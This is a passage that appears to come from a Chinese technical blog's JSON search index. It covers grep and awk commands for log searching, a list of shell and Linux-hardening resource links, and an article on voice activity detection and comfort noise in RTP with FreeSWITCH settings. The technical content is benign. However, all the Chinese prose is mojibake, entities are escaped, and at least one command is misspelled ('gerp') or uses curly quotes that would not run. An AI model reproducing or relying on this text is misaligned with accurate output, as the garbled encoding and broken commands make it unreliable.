-Eï¼šä½¿ç”¨EREï¼Œæ”¯æŒä½¿ç”¨æ‰©å±•çš„æ­£åˆ™è¡¨è¾¾å¼ ï¼cï¼šåªè¾“å‡ºåŒ¹é…è¡Œçš„è®¡æ•°ã€‚ ï¼Iï¼šä¸åŒºåˆ†å¤§ å°å†™(åªé€‚ç”¨äºå•å­—ç¬¦)ã€‚ ï¼hï¼šæŸ¥è¯¢å¤šæ–‡ä»¶æ—¶ä¸æ˜¾ç¤ºæ–‡ä»¶åã€‚ ï¼lï¼šæŸ¥è¯¢å¤šæ–‡ä»¶æ—¶åªè¾“å‡ºåŒ…å«åŒ¹é…å­—ç¬¦çš„æ–‡ä»¶åã€‚ ï¼nï¼šæ˜¾ç¤ºåŒ¹é…è¡ŒåŠ è¡Œå·ã€‚ - m: åŒ¹é…å¤šå°‘ä¸ªå…³é”®è¯ä¹‹åå°±åœæ­¢æœç´¢ ï¼sï¼šä¸æ˜¾ç¤ºä¸å­˜åœ¨æˆ–æ— åŒ¹é…æ–‡æœ¬çš„é”™è¯¯ä¿¡æ¯ã€‚ ï¼vï¼šæ˜¾ç¤ºä¸åŒ…å«åŒ¹é…æ–‡æœ¬çš„æ‰€æœ‰è¡Œã€‚ 2. æ™®é€šï¼šæœç´¢trace.log ä¸­å«æœ‰ERRORå­—æ®µçš„æ—¥å¿— grep ERROR trace.log 3. è¾“å‡ºæ–‡ä»¶ï¼šå¯ä»¥å°†æ—¥å¿—è¾“å‡ºæ–‡ä»¶ä¸­ grep ERROR trace.log \u0026gt; error.log 4. åå‘ï¼šæœç´¢ä¸åŒ…å«ERRORå­—æ®µçš„æ—¥å¿— grep -v ERROR trace.log 5. å‘å‰ï¼šæœç´¢åŒ…å«ERROR,å¹¶ä¸”æ˜¾ç¤ºERRORå‰10è¡Œçš„æ—¥å¿— grep -B 10 ERROR trace.log 6. å‘åï¼šæœç´¢åŒ…å«ERRORå­—æ®µï¼Œå¹¶ä¸”æ˜¾ç¤ºERRORå10è¡Œçš„æ—¥å¿— grep -A 10 ERROR trace.log 7. ä¸Šä¸‹æ–‡ï¼šæœç´¢åŒ…å«ERRORå­—æ®µï¼Œå¹¶ä¸”æ˜¾ç¤ºERRORå­—æ®µå‰å10è¡Œçš„æ—¥å¿— grep -C 10 ERROR trace.log 8. å¤šå­—æ®µï¼šæœç´¢åŒ…å«ERRORå’ŒDEBUGå­—æ®µçš„æ—¥å¿— gerp -E \u0026#39;ERROR|DEBUG\u0026#39; trace.log 9. å¤šæ–‡ä»¶ï¼šä»å¤šä¸ª.logæ–‡ä»¶ä¸­æœç´¢å«æœ‰ERRORçš„æ—¥å¿— grep ERROR *.log 10. çœç•¥æ–‡ä»¶åï¼šä»å¤šä¸ª.logæ–‡ä»¶ä¸­æœç´¢ERRORå­—æ®µæ—¥å¿—ï¼Œå¹¶ä¸æ˜¾ç¤ºæ—¥å¿—æ–‡ä»¶å ä»å¤šä¸ªæ–‡ä»¶ä¸­æœç´¢çš„æ—¥å¿—é»˜è®¤æ¯è¡Œä¼šå¸¦æœ‰æ—¥å¿—æ–‡ä»¶å\ngrep -h ERROR *.log 11. æ—¶é—´èŒƒå›´ï¼š æŒ‰ç…§æ—¶é—´èŒƒå›´æœç´¢æ—¥å¿— awk \u0026#39;$2\u0026gt;\u0026#34;17:30:00\u0026#34; \u0026amp;\u0026amp; $2\u0026lt;\u0026#34;18:00:00\u0026#34;\u0026#39; trace.log æ—¥å¿—å½¢å¼å¦‚ä¸‹, $2ä»£è¡¨ç¬¬äºŒåˆ—å³11:44:58, awkéœ€è¦æŒ‡å®šåˆ—\n11-21 16:44:58 /user/info/\n12. æœ‰æ²¡æœ‰ï¼šæœç´¢åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…è¡Œåå°±åœæ­¢æœç´¢ grep -m 1 ERROR trace.log 13. ä½¿ç”¨æ­£åˆ™æå–å­—ç¬¦ä¸² grep -Eo \u0026#39;cause\u0026#34;:\u0026#34;(.*?)\u0026#34;\u0026#39; test.log cause\u0026#34;:\u0026#34;A\u0026#34; cause\u0026#34;:\u0026#34;B\u0026#34; cause\u0026#34;:\u0026#34;A\u0026#34; cause\u0026#34;:\u0026#34;A\u0026#34; cause\u0026#34;:\u0026#34;A\u0026#34; å¦‚æœç›¸å¯¹æå–å­—ç¬¦ä¸²çš„ç»“æœè¿›è¡ŒæŒ‰ç…§å‡ºç°çš„æ¬¡æ•°è¿›è¡Œæ’åºï¼Œå¯ä»¥ä½¿ç”¨sort, uniqå‘½ä»¤ grep -Eo \u0026lsquo;cause\u0026quot;:\u0026quot;(.*?)\u0026quot;\u0026rsquo; test.log | sort | uniq -c | sort -k1,1 -n\næ­¥éª¤åˆ†è§£\nsort å¯¹ç»“æœè¿›è¡Œæ’åº uniq -c å¯¹ç»“æœè¿›è¡Œå»é‡å¹¶ç»Ÿè®¡å‡ºç°æ¬¡æ•° sort -k1,1 -n æŒ‰ç…§ç¬¬ä¸€åˆ—çš„ç»“æœï¼Œè¿›è¡Œæ•°å€¼å¤§å°æ’åº ","permalink":"https://wdd.js.org/shell/grep-docs/","summary":"1. grep å¸¸ç”¨å‚æ•° å‚è€ƒï¼š GNU Grep 3.0\n--color:é«˜äº®æ˜¾ç¤ºåŒ¹é…åˆ°çš„å­—ç¬¦ä¸² -vï¼šæ˜¾ç¤ºä¸èƒ½è¢«patternåŒ¹é…åˆ°çš„ -iï¼šå¿½ç•¥å­—ç¬¦å¤§å°å†™ -oï¼šä»…æ˜¾ç¤ºåŒ¹é…åˆ°çš„å­—ç¬¦ä¸² -qï¼šé™é»˜æ¨¡å¼ï¼Œä¸è¾“å‡ºä»»ä½•ä¿¡æ¯ -A#ï¼šafterï¼ŒåŒ¹é…åˆ°çš„å#è¡Œ -B#ï¼šbeforeï¼ŒåŒ¹é…åˆ°çš„å‰#è¡Œ -C#ï¼šcontextï¼ŒåŒ¹é…åˆ°çš„å‰åå„#è¡Œ -Eï¼šä½¿ç”¨EREï¼Œæ”¯æŒä½¿ç”¨æ‰©å±•çš„æ­£åˆ™è¡¨è¾¾å¼ ï¼cï¼šåªè¾“å‡ºåŒ¹é…è¡Œçš„è®¡æ•°ã€‚ ï¼Iï¼šä¸åŒºåˆ†å¤§ å°å†™(åªé€‚ç”¨äºå•å­—ç¬¦)ã€‚ ï¼hï¼šæŸ¥è¯¢å¤šæ–‡ä»¶æ—¶ä¸æ˜¾ç¤ºæ–‡ä»¶åã€‚ ï¼lï¼šæŸ¥è¯¢å¤šæ–‡ä»¶æ—¶åªè¾“å‡ºåŒ…å«åŒ¹é…å­—ç¬¦çš„æ–‡ä»¶åã€‚ ï¼nï¼šæ˜¾ç¤ºåŒ¹é…è¡ŒåŠ è¡Œå·ã€‚ - m: åŒ¹é…å¤šå°‘ä¸ªå…³é”®è¯ä¹‹åå°±åœæ­¢æœç´¢ ï¼sï¼šä¸æ˜¾ç¤ºä¸å­˜åœ¨æˆ–æ— åŒ¹é…æ–‡æœ¬çš„é”™è¯¯ä¿¡æ¯ã€‚ ï¼vï¼šæ˜¾ç¤ºä¸åŒ…å«åŒ¹é…æ–‡æœ¬çš„æ‰€æœ‰è¡Œã€‚ 2. æ™®é€šï¼šæœç´¢trace.log ä¸­å«æœ‰ERRORå­—æ®µçš„æ—¥å¿— grep ERROR trace.log 3. è¾“å‡ºæ–‡ä»¶ï¼šå¯ä»¥å°†æ—¥å¿—è¾“å‡ºæ–‡ä»¶ä¸­ grep ERROR trace.log \u0026gt; error.log 4. åå‘ï¼šæœç´¢ä¸åŒ…å«ERRORå­—æ®µçš„æ—¥å¿— grep -v ERROR trace.log 5. å‘å‰ï¼šæœç´¢åŒ…å«ERROR,å¹¶ä¸”æ˜¾ç¤ºERRORå‰10è¡Œçš„æ—¥å¿— grep -B 10 ERROR trace.log 6. å‘åï¼šæœç´¢åŒ…å«ERRORå­—æ®µï¼Œå¹¶ä¸”æ˜¾ç¤ºERRORå10è¡Œçš„æ—¥å¿— grep -A 10 ERROR trace.log 7. ä¸Šä¸‹æ–‡ï¼šæœç´¢åŒ…å«ERRORå­—æ®µï¼Œå¹¶ä¸”æ˜¾ç¤ºERRORå­—æ®µå‰å10è¡Œçš„æ—¥å¿— grep -C 10 ERROR trace.log 8. å¤šå­—æ®µï¼šæœç´¢åŒ…å«ERRORå’ŒDEBUGå­—æ®µçš„æ—¥å¿— gerp -E \u0026#39;ERROR|DEBUG\u0026#39; trace.","title":"grepå¸¸ç”¨å‚è€ƒ"},{"content":"shell è‡ªåŠ¨åŒ–æµ‹è¯• https://github.com/bats-core/bats-core shellç²¾è¿› https://github.com/NARKOZ/hacker-scripts https://github.com/trimstray/the-book-of-secret-knowledge https://legacy.gitbook.com/book/learnbyexample/command-line-text-processing https://github.com/dylanaraps/pure-bash-bible https://github.com/dylanaraps/pure-sh-bible https://github.com/Idnan/bash-guide https://github.com/denysdovhan/bash-handbook https://pubs.opengroup.org/onlinepubs/9699919799/utilities/contents.html https://github.com/jlevy/the-art-of-command-line https://google.github.io/styleguide/shell.xml https://wiki.bash-hackers.org/start https://linuxguideandhints.com/ å®‰å…¨åŠ å›º https://www.lisenet.com/2017/centos-7-server-hardening-guide/ https://highon.coffee/blog/security-harden-centos-7/ https://github.com/trimstray/the-practical-linux-hardening-guide https://github.com/decalage2/awesome-security-hardening https://www.hackingarticles.in/ https://github.com/toniblyx/my-arsenal-of-aws-security-tools ","permalink":"https://wdd.js.org/shell/star-collect/","summary":"shell è‡ªåŠ¨åŒ–æµ‹è¯• https://github.com/bats-core/bats-core shellç²¾è¿› https://github.com/NARKOZ/hacker-scripts https://github.com/trimstray/the-book-of-secret-knowledge https://legacy.gitbook.com/book/learnbyexample/command-line-text-processing https://github.com/dylanaraps/pure-bash-bible https://github.com/dylanaraps/pure-sh-bible https://github.com/Idnan/bash-guide https://github.com/denysdovhan/bash-handbook https://pubs.opengroup.org/onlinepubs/9699919799/utilities/contents.html https://github.com/jlevy/the-art-of-command-line https://google.github.io/styleguide/shell.xml https://wiki.bash-hackers.org/start https://linuxguideandhints.com/ å®‰å…¨åŠ å›º https://www.lisenet.com/2017/centos-7-server-hardening-guide/ https://highon.coffee/blog/security-harden-centos-7/ https://github.com/trimstray/the-practical-linux-hardening-guide https://github.com/decalage2/awesome-security-hardening https://www.hackingarticles.in/ https://github.com/toniblyx/my-arsenal-of-aws-security-tools ","title":"Shell ä¹¦ç±å’Œèµ„æ–™æ”¶è—"},{"content":"äººå£°æ£€æµ‹ VAD äººå£°æ£€æµ‹(VAD: Voice Activity Detection)æ˜¯åŒºåˆ†è¯­éŸ³ä¸­æ˜¯äººè¯´è¯çš„å£°éŸ³ï¼Œè¿˜æ˜¯å…¶ä»–ä¾‹å¦‚ç¯å¢ƒéŸ³çš„ä¸€ç§åŠŸèƒ½ã€‚\né™¤æ­¤ä»¥å¤–ï¼Œäººå£°æ£€æµ‹è¿˜èƒ½ç”¨äºå‡å°‘ç½‘ç»œä¸­è¯­éŸ³åŒ…ä¼ è¾“çš„æ•°æ®é‡ï¼Œä»è€Œæå¤§çš„é™ä½è¯­éŸ³çš„å¸¦å®½ï¼Œæé™æƒ…å†µä¸‹èƒ½é™ä½50%çš„å¸¦å®½ã€‚\nåœ¨ä¸€ä¸ªé€šè¯ä¸­ï¼Œä¸€èˆ¬éƒ½æ˜¯åªæœ‰ä¸€ä¸ªäººè¯´è¯ï¼Œå¦ä¸€äººå¬ã€‚å¾ˆå°‘å¯èƒ½æ˜¯ä¸¤ä¸ªäººéƒ½è¯´è¯çš„ã€‚\nä¾‹å¦‚Aåœ¨è¯´è¯çš„æ—¶å€™ï¼ŒBå¯èƒ½åœ¨ç­‰å¾…ã€‚\nè™½ç„¶Båœ¨ç­‰å¾…è¿‡ç¨‹ä¸­ï¼ŒBçš„è¯­éŸ³æµä¾ç„¶å†æŒ‰ç…§åŸå§‹é€Ÿåº¦å’Œç¼–ç å†å‘ç»™A, å³ä½¿è¿™é‡Œé¢æ˜¯ç¯å¢ƒå™ªéŸ³æˆ–è€…æ˜¯æ— å£°ã€‚\nA ----\u0026gt; B # Aåœ¨è¯´è¯ A \u0026lt;--- B # Båœ¨ç­‰å¾…è¿‡ç¨‹ä¸­ï¼ŒBçš„è¯­éŸ³æµä¾ç„¶å†æŒ‰ç…§åŸå§‹é€Ÿåº¦å’Œç¼–ç å†å‘ç»™A å¦‚æœBå…·æœ‰VADæ£€æµ‹åŠŸèƒ½ï¼Œé‚£ä¹ˆBå°±å¯ä»¥åœ¨ä¸è¯´è¯çš„æ—¶å€™ï¼Œå‘é€ç‰¹æ®Šæ ‡è®°çš„è¯­éŸ³æµæˆ–è€…é€šè¿‡å‡å°‘è¯­éŸ³æµå‘é€çš„é¢‘ç‡ï¼Œæ¥å‡å°‘æ— æ„ä¹‰è¯­éŸ³çš„å‘é€ã€‚\nä»è€Œæå¤§çš„é™ä½B-\u0026gt;Açš„è¯­éŸ³æµã€‚\nä¸‹å›¾æ˜¯WiresharkæŠ“åŒ…çš„ä¸¤ç§RTPåŒ…ï¼Œg711ç¼–ç çš„å 214å­—èŠ‚ï¼Œä½†æ˜¯ç”¨èˆ’é€‚å™ªéŸ³ç¼–ç çš„åªæœ‰63å­—èŠ‚ã€‚å°†è¿‘å‡å°‘äº†4å€çš„å¸¦å®½ã€‚\nèˆ’é€‚å™ªéŸ³ç”Ÿæˆå™¨ CNG èˆ’é€‚å™ªéŸ³(CN stands for Comfort Noise), æ˜¯ä¸€ç§æ¨¡æ‹Ÿçš„èƒŒæ™¯ç¯å¢ƒéŸ³ã€‚èˆ’é€‚å™ªéŸ³ç”Ÿæˆå™¨åœ¨æ¥æ”¶ç«¯æ ¹æ®å‘é€åˆ°ç»™çš„å‚æ•°ï¼Œæ¥äº§ç”Ÿç±»ä¼¼æ¥æ”¶ç«¯çš„èˆ’é€‚å™ªéŸ³, ç”¨æ¥æ¨¡æ‹Ÿå‘é€æ–¹çš„å™ªéŸ³ç¯å¢ƒã€‚\nCNä¹Ÿæ˜¯ä¸€ç§RTPåŒ…çš„æ ¼å¼ï¼Œå®šä¹‰åœ¨RFC 3389\nèˆ’é€‚å™ªéŸ³çš„payload, ä¹Ÿè¢«ç§°ä½œé™éŸ³æ’å…¥æè¿°å¸§(SID: a Silence Insertion Descriptor frame), åŒ…æ‹¬ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œç”¨æ¥æè¿°å™ªéŸ³çš„çº§åˆ«ã€‚ä¹Ÿå¯ä»¥åŒ…å«å…¶ä»–çš„é¢å¤–çš„æ•°æ®ã€‚æ—©æœŸç‰ˆæœ¬çš„èˆ’é€‚å™ªéŸ³çš„æ ¼å¼å®šä¹‰åœ¨RFC 1890ä¸­ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„æ ¼å¼åªåŒ…å«ä¸€ä¸ªå­—æ®µï¼Œå°±æ˜¯å™ªéŸ³çº§åˆ«ã€‚\nå™ªéŸ³çº§åˆ«å ç”¨ä¸€ä¸ªå­—èŠ‚ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªbitå¿…é¡»æ˜¯0ï¼Œ å› æ­¤å™ªéŸ³çº§åˆ«æœ‰127ä¸­å¯èƒ½ã€‚\n0 1 2 3 4 5 6 7 +-+-+-+-+-+-+-+-+ |0| level | +-+-+-+-+-+-+-+-+ è·Ÿç€å™ªéŸ³çº§åˆ«çš„åç»­å­—èŠ‚éƒ½æ˜¯å£°éŸ³çš„é¢‘è°±ä¿¡æ¯ã€‚\nByte 1 2 3 ... M+1 +-----+-----+-----+-----+-----+ |level| N1 | N2 | ... | NM | +-----+-----+-----+-----+-----+ Figure 2: CN Payload Packing Format åœ¨SIP INVITEçš„SDPä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°ç¼–ç ï¼Œå¦‚ä¸‹é¢çš„CN\nm=audio 20000 RTP/AVP 8 111 63 103 104 9 0 106 105 13 110 112 113 126 a=rtpmap:106 CN/32000 a=rtpmap:105 CN/16000 a=rtpmap:13 CN/8000 å½“VADå‡½æ•°æ£€æµ‹åˆ°æ²¡æœ‰äººå£°æ—¶ï¼Œå°±ä¼šå‘é€èˆ’é€‚å™ªéŸ³ã€‚é€šå¸¸æ¥è¯´ï¼Œåªæœ‰å½“ç¯å¢ƒå™ªéŸ³å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œæ‰éœ€è¦å‘é€CNåŒ…ã€‚æ¥æ”¶æ–¹åœ¨æ”¶åˆ°æ–°çš„CNåŒ…åï¼Œä¼šæ›´æ–°äº§ç”Ÿèˆ’é€‚å™ªéŸ³çš„å‚æ•°ã€‚\næ¯”å¦‚ä¸‹å›¾æ˜¯sngrepæŠ“åŒ…å…³äºwebrtcçš„å‘¼å«æ—¶ï¼Œå°±èƒ½çœ‹åˆ°æµè§ˆå™¨é€åˆ°SIP Serverçš„CNåŒ…ã€‚\nâ”‚ \u0026lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ RTP (g711a) 130 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ RTP (g711a) 130 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\u0026gt; â”‚ â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ RTP (g711a) 1168 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ \u0026lt;\u0026lt;\u0026lt;â”€â”€â”€â”€ 200 OK (SDP) â”€â”€â”€â”€â”€â”€ â”‚ â”‚ â”‚ â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 200 OK (SDP) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\u0026gt;\u0026gt;\u0026gt; â”‚ â”‚ â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ACK â”€â”€â”€â”€â”€â”€â”€â”€â”€\u0026gt; â”‚ â”‚ â”‚ â”‚ \u0026lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ACK â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ â”‚ â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ACK â”€â”€â”€â”€â”€â”€â”€â”€â”€\u0026gt; â”‚ â”‚ â”‚ â”‚ \u0026lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ INFO â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ â”‚ â”‚ â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ INFO â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\u0026gt; â”‚ â”‚ â”‚ \u0026lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 200 OK â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ â”‚ â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 200 OK â”€â”€â”€â”€â”€â”€â”€â”€\u0026gt; â”‚ â”‚ â”‚ â”‚ \u0026lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ RTP (cn) 208 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ RTP (cn) 208 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\u0026gt; â”‚ â”‚ \u0026lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ BYE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ â”‚ FreeSWITCH WebRTC å½•éŸ³è´¨é‡å·® FreeSWITCH bridgeä¸¤ä¸ªcall leg, ä¸€ä¾§æ˜¯WebRTCä¸€ä¾§æ˜¯æ™®é€šSIPç»ˆç«¯ï¼Œåœ¨å½•éŸ³çš„æ—¶å€™å‘ç°å½•éŸ³å¡é¡¿åŸºæœ¬æ²¡åŠæ³•å¬ï¼Œä½†æ˜¯åŒå‘é€šè¯çš„è¯­éŸ³æ˜¯æ­£å¸¸çš„ã€‚\næœ€ç»ˆå‘ç°å½•éŸ³è´¨é‡å·®å’Œèˆ’é€‚å™ªéŸ³æœ‰å…³ã€‚\næ–¹æ¡ˆ1: å…¨å±€æŠ‘åˆ¶èˆ’é€‚å™ªéŸ³\n\u0026lt;!-- Video Settings --\u0026gt; \u0026lt;!-- Setting the max bandwdith --\u0026gt; \u0026lt;X-PRE-PROCESS cmd=\u0026#34;set\u0026#34; data=\u0026#34;rtp_video_max_bandwidth_in=3mb\u0026#34;/\u0026gt; \u0026lt;X-PRE-PROCESS cmd=\u0026#34;set\u0026#34; data=\u0026#34;rtp_video_max_bandwidth_out=3mb\u0026#34;/\u0026gt; \u0026lt;!-- WebRTC Video --\u0026gt; \u0026lt;!-- Suppress CNG for WebRTC Audio --\u0026gt; \u0026lt;X-PRE-PROCESS cmd=\u0026#34;set\u0026#34; data=\u0026#34;suppress_cng=true\u0026#34;/\u0026gt; \u0026lt;!-- Enable liberal DTMF for those that can\u0026#39;t get it right --\u0026gt; \u0026lt;X-PRE-PROCESS cmd=\u0026#34;set\u0026#34; data=\u0026#34;rtp_liberal_dtmf=true\u0026#34;/\u0026gt; \u0026lt;!-- Helps with WebRTC Audio --\u0026gt; \u0026lt;!-- Stock Video Avatars --\u0026gt; \u0026lt;X-PRE-PROCESS cmd=\u0026#34;set\u0026#34; data=\u0026#34;video_mute_png=$${images_dir}/default-mute.png\u0026#34;/\u0026gt; \u0026lt;X-PRE-PROCESS cmd=\u0026#34;set\u0026#34; data=\u0026#34;video_no_avatar_png=$${images_dir}/default-avatar.png\u0026#34;/\u0026gt; æ–¹æ¡ˆ2: åœ¨BlegæŠ‘åˆ¶èˆ’é€‚å™ªéŸ³\n\u0026lt;action application=\u0026#34;set\u0026#34; data=\u0026#34;bridge_generate_comfort_noise=true\u0026#34;/\u0026gt; \u0026lt;action application=\u0026#34;bridge\u0026#34; data=\u0026#34;sofia/user/1000\u0026#34;/\u0026gt; å‚è€ƒ https://freeswitch.org/confluence/display/FREESWITCH/VAD+and+CNG https://www.rfc-editor.org/rfc/rfc3389 https://www.rfc-editor.org/rfc/rfc1890 https://freeswitch.org/confluence/display/FREESWITCH/Sofia+Configuration+Files#SofiaConfigurationFiles-suppress-cng https://freeswitch.org/confluence/display/FREESWITCH/bridge_generate_comfort_noise ","permalink":"https://wdd.js.org/freeswitch/webrtc-vad-cng/","summary":"äººå£°æ£€æµ‹ VAD äººå£°æ£€æµ‹(VAD: Voice Activity Detection)æ˜¯åŒºåˆ†è¯­éŸ³ä¸­æ˜¯äººè¯´è¯çš„å£°éŸ³ï¼Œè¿˜æ˜¯å…¶ä»–ä¾‹å¦‚ç¯å¢ƒéŸ³çš„ä¸€ç§åŠŸèƒ½ã€‚\né™¤æ­¤ä»¥å¤–ï¼Œäººå£°æ£€æµ‹è¿˜èƒ½ç”¨äºå‡å°‘ç½‘ç»œä¸­è¯­éŸ³åŒ…ä¼ è¾“çš„æ•°æ®é‡ï¼Œä»è€Œæå¤§çš„é™ä½è¯­éŸ³çš„å¸¦å®½ï¼Œæé™æƒ…å†µä¸‹èƒ½é™ä½50%çš„å¸¦å®½ã€‚\nåœ¨ä¸€ä¸ªé€šè¯ä¸­ï¼Œä¸€èˆ¬éƒ½æ˜¯åªæœ‰ä¸€ä¸ªäººè¯´è¯ï¼Œå¦ä¸€äººå¬ã€‚å¾ˆå°‘å¯èƒ½æ˜¯ä¸¤ä¸ªäººéƒ½è¯´è¯çš„ã€‚\nä¾‹å¦‚Aåœ¨è¯´è¯çš„æ—¶å€™ï¼ŒBå¯èƒ½åœ¨ç­‰å¾…ã€‚\nè™½ç„¶Båœ¨ç­‰å¾…è¿‡ç¨‹ä¸­ï¼ŒBçš„è¯­éŸ³æµä¾ç„¶å†æŒ‰ç…§åŸå§‹é€Ÿåº¦å’Œç¼–ç å†å‘ç»™A, å³ä½¿è¿™é‡Œé¢æ˜¯ç¯å¢ƒå™ªéŸ³æˆ–è€…æ˜¯æ— å£°ã€‚\nA ----\u0026gt; B # Aåœ¨è¯´è¯ A \u0026lt;--- B # Båœ¨ç­‰å¾…è¿‡ç¨‹ä¸­ï¼ŒBçš„è¯­éŸ³æµä¾ç„¶å†æŒ‰ç…§åŸå§‹é€Ÿåº¦å’Œç¼–ç å†å‘ç»™A å¦‚æœBå…·æœ‰VADæ£€æµ‹åŠŸèƒ½ï¼Œé‚£ä¹ˆBå°±å¯ä»¥åœ¨ä¸è¯´è¯çš„æ—¶å€™ï¼Œå‘é€ç‰¹æ®Šæ ‡è®°çš„è¯­éŸ³æµæˆ–è€…é€šè¿‡å‡å°‘è¯­éŸ³æµå‘é€çš„é¢‘ç‡ï¼Œæ¥å‡å°‘æ— æ„ä¹‰è¯­éŸ³çš„å‘é€ã€‚\nä»è€Œæå¤§çš„é™ä½B-\u0026gt;Açš„è¯­éŸ³æµã€‚\nä¸‹å›¾æ˜¯WiresharkæŠ“åŒ…çš„ä¸¤ç§RTPåŒ…ï¼Œg711ç¼–ç çš„å 214å­—èŠ‚ï¼Œä½†æ˜¯ç”¨èˆ’é€‚å™ªéŸ³ç¼–ç çš„åªæœ‰63å­—èŠ‚ã€‚å°†è¿‘å‡å°‘äº†4å€çš„å¸¦å®½ã€‚\nèˆ’é€‚å™ªéŸ³ç”Ÿæˆå™¨ CNG èˆ’é€‚å™ªéŸ³(CN stands for Comfort Noise), æ˜¯ä¸€ç§æ¨¡æ‹Ÿçš„èƒŒæ™¯ç¯å¢ƒéŸ³ã€‚èˆ’é€‚å™ªéŸ³ç”Ÿæˆå™¨åœ¨æ¥æ”¶ç«¯æ ¹æ®å‘é€åˆ°ç»™çš„å‚æ•°ï¼Œæ¥äº§ç”Ÿç±»ä¼¼æ¥æ”¶ç«¯çš„èˆ’é€‚å™ªéŸ³, ç”¨æ¥æ¨¡æ‹Ÿå‘é€æ–¹çš„å™ªéŸ³ç¯å¢ƒã€‚\nCNä¹Ÿæ˜¯ä¸€ç§RTPåŒ…çš„æ ¼å¼ï¼Œå®šä¹‰åœ¨RFC 3389\nèˆ’é€‚å™ªéŸ³çš„payload, ä¹Ÿè¢«ç§°ä½œé™éŸ³æ’å…¥æè¿°å¸§(SID: a Silence Insertion Descriptor frame), åŒ…æ‹¬ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œç”¨æ¥æè¿°å™ªéŸ³çš„çº§åˆ«ã€‚ä¹Ÿå¯ä»¥åŒ…å«å…¶ä»–çš„é¢å¤–çš„æ•°æ®ã€‚æ—©æœŸç‰ˆæœ¬çš„èˆ’é€‚å™ªéŸ³çš„æ ¼å¼å®šä¹‰åœ¨RFC 1890ä¸­ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„æ ¼å¼åªåŒ…å«ä¸€ä¸ªå­—æ®µï¼Œå°±æ˜¯å™ªéŸ³çº§åˆ«ã€‚\nå™ªéŸ³çº§åˆ«å ç”¨ä¸€ä¸ªå­—èŠ‚ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªbitå¿…é¡»æ˜¯0ï¼Œ å› æ­¤å™ªéŸ³çº§åˆ«æœ‰127ä¸­å¯èƒ½ã€‚\n0 1 2 3 4 5 6 7 +-+-+-+-+-+-+-+-+ |0| level | +-+-+-+-+-+-+-+-+ 